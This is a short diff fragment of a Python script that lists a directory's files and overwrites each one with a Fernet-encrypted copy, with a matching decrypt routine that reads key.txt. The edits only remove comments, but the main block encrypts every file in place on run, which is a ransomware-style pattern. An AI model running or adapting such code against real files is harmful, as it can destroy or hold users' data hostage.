@@ -14,7 +14,7 @@ def dirFiles():
             fileList.append(file)
 
 
-# Encryptor
+
 def encrypt():
     key = Fernet.generate_key()
 
@@ -29,7 +29,7 @@ def encrypt():
             samefile.write(encrpytedContent)
 
 
-# Decryptor
+
 def decrypt():
     with open("key.txt", "rb") as key:
         secret = key.read()
@@ -42,7 +42,7 @@ def decrypt():
             samefile.write(decryptedContent)
 
 
-# main
+
 if __name__ == "__main__":
     dirFiles()
     encrypt()
